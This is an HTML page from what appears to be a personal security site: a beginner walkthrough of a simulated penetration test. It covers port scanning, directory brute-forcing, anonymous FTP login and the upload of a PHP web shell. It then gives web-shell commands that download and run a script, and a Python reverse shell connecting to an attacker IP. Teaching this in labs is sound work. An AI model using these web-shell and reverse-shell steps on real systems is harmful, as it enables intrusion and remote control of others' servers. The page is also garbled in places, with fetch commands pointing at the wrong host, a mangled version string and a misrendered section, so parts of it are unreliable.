<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Example Doc: API V1 | Technical Intelligence Labs</title>
    <link rel="stylesheet" href="../css/custom.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; padding-left: 2rem; border-left: 2px solid rgba(255, 255, 255, 0.1); position: relative; }
        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
        .markdown-content h1::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 10px; height: 10px; background: #fff; border-radius: 50%; box-shadow: 0 0 10px #22c55e; border: 2px solid #0f172a; transform: translateY(-50%); }
        .markdown-content h2 { font-size: 1.75rem; color: #f8fafc; margin-top: 3rem; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
        .markdown-content h2::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
        .markdown-content h3 { font-size: 1.25rem; color: #e2e8f0; margin-top: 2rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace; position: relative; }
        .markdown-content h3::before { content: ''; position: absolute; left: -2.3rem; top: 50%; width: 6px; height: 6px; background: #0ea5e9; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; border: 1px solid #334155; position: relative; }
        .markdown-content pre::before { content: "CODE_BLOCK"; position: absolute; top: 0; right: 0; background: #334155; color: #cbd5e1; font-size: 0.6rem; padding: 0.2rem 0.5rem; font-family: 'JetBrains Mono', monospace; border-bottom-left-radius: 0.5rem; }
        .markdown-content blockquote { 
            position: relative;
            border-left: 2px solid #22c55e; 
            padding: 1.5rem 0 1.5rem 1.75rem; 
            color: #cbd5e1; 
            margin-bottom: 2.5rem; 
            font-style: normal; 
            background: rgba(34, 197, 94, 0.03);
            border-radius: 0 4px 4px 0;
            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
        }
        .markdown-content blockquote::before {
            content: "TECHNICAL_INTELLIGENCE";
            position: absolute;
            top: -9px;
            left: 0;
            background: #22c55e;
            color: #000;
            font-size: 0.6rem;
            font-weight: bold;
            padding: 2px 6px;
            font-family: 'JetBrains Mono', monospace;
        }
        .markdown-content ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 1.5rem; }
        .markdown-content p { margin-bottom: 1.5rem; }
        
        .diag-card {
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.05);
            padding: 1rem;
            font-family: 'JetBrains Mono', monospace;
            position: relative;
            overflow: hidden;
        }
        .diag-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 2px;
            height: 100%;
            background: #22c55e;
            opacity: 0.5;
        }
        .diag-label {
            display: block;
            font-size: 0.6rem;
            text-transform: uppercase;
            color: #64748b;
            margin-bottom: 0.25rem;
            letter-spacing: 0.1em;
        }
        .diag-value {
            font-size: 0.9rem;
            color: #cbd5e1;
        }
        .diag-blink {
            animation: blink 1s infinite;
        }
        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>
<body class="bg-slate-950 text-slate-200 antialiased selection:bg-accent-green selection:text-slate-900 flex flex-col min-h-screen">

    <!-- Navigation -->
    <nav class="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-md border-b border-slate-700">
        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
            <a href="../index.html" class="logo-container group flex items-center gap-3">
                 <img src="../images/logo.png" alt="Logo" class="h-10 w-auto group-hover:scale-105 transition-transform duration-300">
            </a>

            <div class="hidden lg:flex items-center gap-8 font-mono text-sm">
                <a href="../index.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Home</a>
                <a href="../about.html" class="text-slate-400 hover:text-accent-cyan transition-colors">About</a>
                <a href="../devhub.html" class="text-slate-400 hover:text-accent-cyan transition-colors">DevHub</a>
                <a href="../projects.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Projects</a>
                <a href="../writeups.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Write-ups</a>
                <a href="../certificates.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Certs</a>
                <a href="../contact.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Contact</a>
            </div>
        </div>
    </nav>

    <!-- Main Content -->
    <main class="py-20 px-6 max-w-7xl mx-auto flex-grow w-full">
        <!-- Post Header -->
        <header class="mb-12 border-b border-slate-800 pb-12">
            <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">docs</span>
                <span>// 2026-01-05</span>
                <span>// ID: REF-Example Doc: API V1</span>
            </div>
            
            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Example Doc: API V1</h1>
            
            <div class="flex flex-wrap gap-2">
                <!-- Tags populated by python -->
                <!-- api, web, enumeration, exploitation, privilege escalation, nmap, gobuster, ffuf, python, shell -->
            </div>
        </header>

        <!-- Markdown Body -->
        <div class="markdown-content">
            <hr />
<p>Welcome, aspiring cybersecurity professionals! This walkthrough will guide you through a simulated penetration test, breaking down each step with clear explanations and focusing on the "why" behind our actions. We'll start from the very beginning, discovering the target, understanding its services, and eventually finding a way to gain access.</p>
<h2>Reconnaissance</h2>
<p>Our first step is to understand what we're up against. This usually involves identifying live hosts and open ports.</p>
<p>In this scenario, we'll assume we've already identified an IP address for our target machine.</p>
<h2>Enumeration</h2>
<p>Now that we know the target's IP, we need to figure out what services are running on it. This is like knocking on doors and seeing who answers.</p>
<h3>Port Scanning</h3>
<p>We'll start by scanning the common ports to see what's open. A popular tool for this is Nmap.</p>
<div class="codehilite"><pre><span></span><code>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.10.10.10
</code></pre></div>

<p><strong>ðŸ§  Beginner Analysis</strong></p>
<ul>
<li><strong><code>nmap</code></strong>: This is our Network Mapper, a powerful tool for discovering hosts and services on a network.</li>
<li><strong><code>-sC</code></strong>: This flag tells Nmap to run the default set of scripts. These scripts can help us gather more information about the services running on the open ports, like checking for known vulnerabilities or retrieving banners.</li>
<li><strong><code>-sV</code></strong>: This flag instructs Nmap to perform version detection. It tries to figure out the exact software and version number running on each open port. This is crucial because specific software versions often have known security flaws.</li>
<li><strong><code>-p-</code></strong>: This tells Nmap to scan all 65535 possible TCP ports. While this can be thorough, it's also time-consuming. In a real-world scenario, you might start with a scan of the most common ports first.</li>
<li><strong><code>10.10.10.10</code></strong>: This is the IP address of our target machine.</li>
</ul>
<p>Let's imagine Nmap gives us the following output:</p>
<div class="codehilite"><pre><span></span><code><span class="nt">Starting</span><span class="w"> </span><span class="nt">Nmap</span><span class="w"> </span><span class="nt">7</span><span class="p">.</span><span class="nc">92</span><span class="w"> </span><span class="o">(</span><span class="w"> </span><span class="nt">https</span><span class="o">://</span><span class="nt">nmap</span><span class="p">.</span><span class="nc">org</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="nt">at</span><span class="w"> </span><span class="nt">2023-10-27</span><span class="w"> </span><span class="nt">10</span><span class="p">:</span><span class="nd">00</span><span class="w"> </span><span class="nt">UTC</span>
<span class="nt">Nmap</span><span class="w"> </span><span class="nt">scan</span><span class="w"> </span><span class="nt">report</span><span class="w"> </span><span class="nt">for</span><span class="w"> </span><span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span>
<span class="nt">Host</span><span class="w"> </span><span class="nt">is</span><span class="w"> </span><span class="nt">up</span><span class="w"> </span><span class="o">(</span><span class="nt">0</span><span class="p">.</span><span class="nc">050s</span><span class="w"> </span><span class="nt">latency</span><span class="o">).</span>
<span class="nt">Not</span><span class="w"> </span><span class="nt">shown</span><span class="o">:</span><span class="w"> </span><span class="nt">65532</span><span class="w"> </span><span class="nt">closed</span><span class="w"> </span><span class="nt">tcp</span><span class="w"> </span><span class="nt">ports</span><span class="w"> </span><span class="o">(</span><span class="nt">reset</span><span class="o">)</span>
<span class="nt">PORT</span><span class="w">     </span><span class="nt">STATE</span><span class="w"> </span><span class="nt">SERVICE</span><span class="w"> </span><span class="nt">VERSION</span>
<span class="nt">21</span><span class="o">/</span><span class="nt">tcp</span><span class="w">   </span><span class="nt">open</span><span class="w">  </span><span class="nt">ftp</span><span class="w">     </span><span class="nt">vsftpd</span><span class="w"> </span><span class="nt">3</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">3</span>
<span class="nt">22</span><span class="o">/</span><span class="nt">tcp</span><span class="w">   </span><span class="nt">open</span><span class="w">  </span><span class="nt">ssh</span><span class="w">     </span><span class="nt">OpenSSH</span><span class="w"> </span><span class="nt">7</span><span class="p">.</span><span class="nc">6p1</span><span class="w"> </span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">4ubuntu0</span><span class="p">.</span><span class="nc">3</span><span class="w"> </span><span class="o">(</span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">protocol</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="o">)</span>
<span class="nt">80</span><span class="o">/</span><span class="nt">tcp</span><span class="w">   </span><span class="nt">open</span><span class="w">  </span><span class="nt">http</span><span class="w">    </span><span class="nt">Apache</span><span class="w"> </span><span class="nt">httpd</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">29</span><span class="w"> </span><span class="o">((</span><span class="nt">Ubuntu</span><span class="o">))</span>
<span class="nt">443</span><span class="o">/</span><span class="nt">tcp</span><span class="w">  </span><span class="nt">open</span><span class="w">  </span><span class="nt">ssl</span><span class="o">/</span><span class="nt">http</span><span class="w"> </span><span class="nt">Apache</span><span class="w"> </span><span class="nt">httpd</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">29</span><span class="w"> </span><span class="o">((</span><span class="nt">Ubuntu</span><span class="o">))</span>
</code></pre></div>

<p><strong>ðŸ§  Beginner Analysis</strong></p>
<ul>
<li><strong><code>PORT STATE SERVICE VERSION</code></strong>: This is the header for the information Nmap provides about each port.</li>
<li><strong><code>21/tcp open ftp vsftpd 3.0.3</code></strong>: We see that port 21 is open, which is the standard port for the File Transfer Protocol (FTP). The <code>vsftpd 3.0.3</code> tells us the specific FTP server software and its version. FTP is often used for transferring files, and sometimes it can be misconfigured, allowing anonymous logins.</li>
<li><strong><code>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4Ð³Ñ€Ð°Ð¼Ð¼0.3 (...)</code></strong>: Port 22 is for Secure Shell (SSH), used for secure remote logins. The version <code>OpenSSH 7.6p1</code> is listed. SSH is generally secure, but sometimes weak passwords or configuration issues can be exploited.</li>
<li><strong><code>80/tcp open http Apache httpd 2.4.29 ((Ubuntu))</code></strong>: Port 80 is the standard port for HTTP, meaning there's a web server running. The <code>Apache httpd 2.4.29</code> tells us it's an Apache web server. Web servers are a very common attack vector as they often host web applications that can have vulnerabilities.</li>
<li><strong><code>443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu))</code></strong>: Port 443 is for HTTPS, the secure version of HTTP. It's also running Apache. We'll likely want to investigate both port 80 and 443.</li>
</ul>
<h3>Web Server Enumeration</h3>
<p>Since we found a web server on port 80, let's explore it. We'll use a tool called <code>gobuster</code> (or <code>ffuf</code>, which is very similar) to try and discover hidden directories and files on the web server.</p>
<div class="codehilite"><pre><span></span><code>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://10.10.10.10<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span class="w"> </span>-x<span class="w"> </span>php,txt,html,js,bak
</code></pre></div>

<p><strong>ðŸ§  Beginner Analysis</strong></p>
<ul>
<li><strong><code>gobuster dir</code></strong>: This command initiates a directory and file brute-forcing scan with Gobuster.</li>
<li><strong><code>-u http://10.10.10.10</code></strong>: This specifies the target URL. We're targeting the web server running on port 80 of our target machine.</li>
<li><strong><code>-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></strong>: This flag points to a wordlist. Wordlists are files containing common directory and file names. Gobuster will try appending each word from this list to our URL to see if they exist. <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code> is a common location for such wordlists on Linux systems.</li>
<li><strong><code>-x php,txt,html,js,bak</code></strong>: This option tells Gobuster to only look for files with these specific extensions. We're including common web file extensions (<code>.php</code>, <code>.html</code>, <code>.js</code>) and also looking for backup files (<code>.bak</code>) which might contain sensitive information.</li>
</ul>
<p>Let's assume Gobuster finds something interesting:</p>
<div class="codehilite"><pre><span></span><code><span class="o">/</span><span class="n">api</span><span class="w">              </span><span class="p">(</span><span class="n">Status</span><span class="o">:</span><span class="w"> </span><span class="mi">200</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="n">Size</span><span class="o">:</span><span class="w"> </span><span class="mi">1500</span><span class="p">]</span>
<span class="o">/</span><span class="n">admin</span><span class="w">            </span><span class="p">(</span><span class="n">Status</span><span class="o">:</span><span class="w"> </span><span class="mi">301</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="o">---&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="p">]</span>
<span class="o">/</span><span class="n">blog</span><span class="w">             </span><span class="p">(</span><span class="n">Status</span><span class="o">:</span><span class="w"> </span><span class="mi">301</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="o">---&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">blog</span><span class="o">/</span><span class="p">]</span>
<span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">users</span><span class="w">        </span><span class="p">(</span><span class="n">Status</span><span class="o">:</span><span class="w"> </span><span class="mi">200</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="n">Size</span><span class="o">:</span><span class="w"> </span><span class="mi">120</span><span class="p">]</span>
<span class="o">/</span><span class="n">backup</span><span class="p">.</span><span class="n">php</span><span class="p">.</span><span class="n">bak</span><span class="w">   </span><span class="p">(</span><span class="n">Status</span><span class="o">:</span><span class="w"> </span><span class="mi">200</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="n">Size</span><span class="o">:</span><span class="w"> </span><span class="mi">500</span><span class="p">]</span>
</code></pre></div>

<p><strong>ðŸ§  Beginner Analysis</strong></p>
<ul>
<li><strong><code>/api (Status: 200)</code></strong>: We found a directory named <code>api</code> that returns a successful (200) status code. This is a strong indicator of an API endpoint. APIs (Application Programming Interfaces) are often how different software components communicate, and they can be a treasure trove of information or a pathway for exploitation if not secured properly.</li>
<li><strong><code>/admin (Status: 301)</code></strong>: This shows a redirect to <code>/admin/</code>. This suggests an administrative interface, which is often a target for credential stuffing or brute-forcing attacks.</li>
<li><strong><code>/blog (Status: 301)</code></strong>: Similarly, a redirect to <code>/blog/</code> suggests a blog section, which might have its own vulnerabilities, such as outdated content management systems.</li>
<li><strong><code>/api/users (Status: 200)</code></strong>: This is particularly interesting! It seems to be an endpoint within the <code>/api</code> directory that lists users. This is a common API function.</li>
<li><strong><code>/backup.php.bak (Status: 200)</code></strong>: We found a backup file for a PHP script. Backup files can sometimes contain plain text credentials or other sensitive configurations.</li>
</ul>
<h3>API Enumeration (Deeper Dive)</h3>
<p>We discovered an <code>/api</code> directory and a <code>/api/users</code> endpoint. Let's examine the API documentation we found earlier to understand how it works.</p>
<p>The documentation states:</p>
<div class="codehilite"><pre><span></span><code><span class="gh">#</span> API V1 Documentation

<span class="k">&gt; </span><span class="ge">**Version**: 1.0.0</span>
<span class="k">&gt; </span><span class="ge">**Status**: Stable</span>

<span class="gu">##</span> Endpoints
<span class="gu">##</span># GET /users
Returns a list of users.

**Response**:
```json
[
  { &quot;id&quot;: 1, &quot;name&quot;: &quot;Alice&quot; }
]
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="o">**</span><span class="err">ðŸ§ </span><span class="w"> </span><span class="n">Beginner</span><span class="w"> </span><span class="n">Analysis</span><span class="o">**</span>

<span class="o">*</span><span class="w">   </span><span class="o">**</span><span class="n">API</span><span class="w"> </span><span class="n">Version</span><span class="o">**:</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">API</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">documented</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">version</span><span class="w"> </span><span class="n n-Quoted">`1.0.0`</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">marked</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n n-Quoted">`Stable`</span><span class="p">.</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">tells</span><span class="w"> </span><span class="n">us</span><span class="w"> </span><span class="n">we</span><span class="s1">&#39;re dealing with a known, relatively mature version.</span>
<span class="s1">*   **Endpoint: `GET /users`**: This is the crucial part. The documentation explicitly states that a `GET` request to the `/users` endpoint will return a list of users.</span>
<span class="s1">*   **Response Format**: The example response shows a JSON array, where each object represents a user with an `id` and `name`.</span>

<span class="s1">We can interact with this endpoint directly using `curl` or by visiting it in our browser. Let&#39;</span><span class="n">s</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="n n-Quoted">`curl`</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">programmatic</span><span class="w"> </span><span class="n">approach</span><span class="p">.</span>

<span class="n n-Quoted">`</span><span class="n n-Quoted n-Quoted-Escape">``</span><span class="n n-Quoted">bash</span>
<span class="n n-Quoted">curl http://10.10.10.10/api/users</span>
</code></pre></div>

<p><strong>ðŸ§  Beginner Analysis</strong></p>
<ul>
<li><strong><code>curl</code></strong>: This is a command-line tool for transferring data with URLs. It's very versatile for interacting with web servers and APIs.</li>
<li><strong><code>http://10.10.10.10/api/users</code></strong>: This is the URL we're sending a <code>GET</code> request to. We're requesting the <code>/users</code> endpoint from our target API.</li>
</ul>
<p>If successful, this command will return the same JSON output as shown in the documentation:</p>
<div class="codehilite"><pre><span></span><code><span class="p">[</span>
<span class="w">  </span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Alice&quot;</span><span class="w"> </span><span class="p">}</span>
<span class="p">]</span>
</code></pre></div>

<p>This confirms our API is functioning as documented and provides us with usernames. In a real scenario, we might find more users, which could be useful for brute-forcing login forms on the <code>/admin</code> panel, for example.</p>
<h2>Exploitation</h2>
<p>Now that we've enumerated services and understood some of the target's functionalities, it's time to look for ways to exploit any weaknesses we've found.</p>
<h3>Anonymous FTP Access</h3>
<p>Remember the FTP server on port 21 (<code>vsftpd 3.0.3</code>)? One common misconfiguration is allowing anonymous logins. Let's try to log in using the username <code>anonymous</code> and any password.</p>
<div class="codehilite"><pre><span></span><code>ftp<span class="w"> </span><span class="m">10</span>.10.10.10
</code></pre></div>

<p>Upon connecting, we'd be prompted for a username and password. Entering <code>anonymous</code> and a blank password often works.</p>
<div class="codehilite"><pre><span></span><code>Connected to 10.10.10.10.
220 (vsFTPd 3.0.3)
Name (10.10.10.10:user): anonymous
331 Please specify the password.
Password:
230 Login successful.
ftp&gt;
</code></pre></div>

<p><strong>ðŸ§  Beginner Analysis</strong></p>
<ul>
<li><strong><code>ftp 10.10.10.10</code></strong>: This command initiates an FTP connection to our target IP address.</li>
<li><strong><code>Name (...): anonymous</code></strong>: We entered <code>anonymous</code> as the username.</li>
<li><strong><code>Password:</code></strong>: We pressed Enter without typing a password.</li>
<li><strong><code>230 Login successful.</code></strong>: Success! The FTP server allowed us to log in without any credentials. This is a critical security misconfiguration.</li>
</ul>
<p>Once logged in, we can list directories and upload files. Let's check the available directories:</p>
<div class="codehilite"><pre><span></span><code>ls
</code></pre></div>

<p>Imagine we see a directory like <code>uploads</code>.</p>
<div class="codehilite"><pre><span></span><code><span class="n">cd</span><span class="w"> </span><span class="n">uploads</span>
<span class="n">ls</span>
</code></pre></div>

<p>Now, let's try to upload a simple web shell. A web shell is a script that we can upload to the web server, and then access via our browser to execute commands on the server.</p>
<p>We'll create a basic PHP web shell named <code>shell.php</code>:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="k">echo</span> <span class="s2">&quot;&lt;h1&gt;System Command Executer&lt;/h1&gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])){</span>
        <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span>
        <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
        <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div>

<p>Then, we upload it using FTP:</p>
<div class="codehilite"><pre><span></span><code>put shell.php
</code></pre></div>

<p><strong>ðŸ§  Beginner Analysis</strong></p>
<ul>
<li><strong><code>ls</code></strong>: Lists the files and directories on the FTP server.</li>
<li><strong><code>cd uploads</code></strong>: Changes the current directory to <code>uploads</code>.</li>
<li><strong><code>put shell.php</code></strong>: This command uploads the local file <code>shell.php</code> to the current directory on the FTP server.</li>
<li><strong>Web Shell Concept</strong>: The PHP code we wrote is a "web shell". When we upload this to the web server (running on port 80) and access it via our browser, we can pass commands to the <code>system()</code> function. For instance, if we visit <code>http://10.10.10.10/uploads/shell.php?cmd=whoami</code>, the server will execute <code>whoami</code> and display the output. This is a direct way to execute commands on the server.</li>
</ul>
<p>Now, we can access our uploaded shell through the web server:</p>
<div class="codehilite"><pre><span></span><code><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.10</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">whoami</span>
</code></pre></div>

<p>This should return the username of the user running the web server (e.g., <code>www-data</code>). We can now execute any command within the context of this user!</p>
<h3>Gaining a Shell</h3>
<p>We can use our web shell to download a more robust reverse shell. A reverse shell is a connection initiated <em>from</em> the target machine <em>back</em> to our attacker machine, giving us a more interactive command-line interface.</p>
<p>First, we need to set up a listener on our attacker machine to receive the incoming connection. We'll use <code>netcat</code> for this.</p>
<div class="codehilite"><pre><span></span><code>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
</code></pre></div>

<p><strong>ðŸ§  Beginner Analysis</strong></p>
<ul>
<li><strong><code>nc</code></strong>: <code>netcat</code>, often called the "Swiss army knife" of networking. It can read and write data across network connections using TCP or UDP.</li>
<li><strong><code>-l</code></strong>: Listen mode.</li>
<li><strong><code>-v</code></strong>: Verbose output, which means <code>nc</code> will tell us when it's listening and when a connection comes in.</li>
<li><strong><code>-n</code></strong>: Do not do DNS lookups. This can speed things up.</li>
<li><strong><code>-p 4444</code></strong>: Listen on port <code>4444</code>. We can choose any available port.</li>
</ul>
<p>Now, using our web shell, we'll instruct the target to download and execute a Python reverse shell script. For demonstration, let's assume our attacker IP is <code>10.10.14.2</code>.</p>
<p>In the web shell URL, we'd put something like:</p>
<div class="codehilite"><pre><span></span><code><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.10</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">wget</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.10</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">O</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">py</span><span class="p">;</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">py</span>
</code></pre></div>

<p>Or if <code>wget</code> isn't available, we might use <code>curl</code>:</p>
<div class="codehilite"><pre><span></span><code><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.10</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">curl</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.10</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">py</span><span class="p">;</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">py</span>
</code></pre></div>

<p>The <code>shell.py</code> script would look something like this:</p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="n">HOST</span> <span class="o">=</span> <span class="s1">&#39;10.10.14.2&#39;</span>  <span class="c1"># Our attacker IP</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">4444</span>          <span class="c1"># The port we&#39;re listening on</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>

<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="mi">2</span><span class="p">)</span>

<span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">,</span> <span class="s2">&quot;-i&quot;</span><span class="p">])</span>
</code></pre></div>

<p><strong>ðŸ§  Beginner Analysis</strong></p>
<ul>
<li><strong><code>wget http://10.10.10.10/shell.py -O /tmp/shell.py</code></strong>: This command uses <code>wget</code> to download our Python reverse shell script from our attacker machine (assuming we hosted it there) to the temporary directory <code>/tmp</code> on the target machine. The <code>-O</code> flag specifies the output filename.</li>
<li><strong><code>python /tmp/shell.py</code></strong>: This executes the downloaded Python script.</li>
<li><strong><code>shell.py</code> explanation</strong>:<ul>
<li><code>import socket, subprocess, os</code>: Imports necessary Python modules for networking and process management.</li>
<li><code>HOST</code> and <code>PORT</code>: Define our attacker's IP address and the listening port.</li>
<li><code>s = socket.socket(...)</code>: Creates a new TCP socket object.</li>
<li><code>s.connect((HOST, PORT))</code>: Connects the socket to our listener on the attacker machine.</li>
<li><code>os.dup2(...)</code>: This is the magic! It redirects the standard input (0), standard output (1), and standard error (2) of the current process to the network socket. This means anything we type in our <code>netcat</code> listener will be sent to the target, and anything the target prints will be sent back to our listener.</li>
<li><code>subprocess.call(["/bin/bash", "-i"])</code>: Starts an interactive bash shell (<code>-i</code>) and pipes its input/output through the redirected socket.</li>
</ul>
</li>
</ul>
<p>Once the Python script executes on the target, our <code>netcat</code> listener should show a connection:</p>
<div class="codehilite"><pre><span></span><code><span class="n">Listening</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="p">[</span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">]</span><span class="w"> </span><span class="p">(</span><span class="n">family</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="mi">4444</span><span class="p">)</span>
